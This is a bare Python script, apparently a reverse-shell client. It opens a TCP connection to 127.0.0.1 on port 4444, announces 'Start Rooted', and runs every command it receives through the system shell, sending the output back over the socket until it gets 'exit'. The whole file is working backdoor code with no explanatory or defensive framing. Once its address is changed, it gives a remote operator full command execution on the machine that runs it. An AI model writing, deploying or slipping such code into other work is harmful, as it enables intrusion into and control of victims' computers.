import socket
import subprocess
import os 

os.system('cls')

ip = '127.0.0.1'
port = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.connect((ip, port))

print("[-] Start Rooted...")

session = True
while session:
     output_data = s.recv(1024)
     if output_data == b'exit':
          print("[+] Session Closed")
          s.close()
          break

     else:
          data_proc = subprocess.Popen(output_data, 
               shell=True,
               stdout=subprocess.PIPE,
               stderr=subprocess.PIPE,
               stdin=subprocess.PIPE)

          output = data_proc.stdout.read() + data_proc.stderr.read()
          s.send(output)
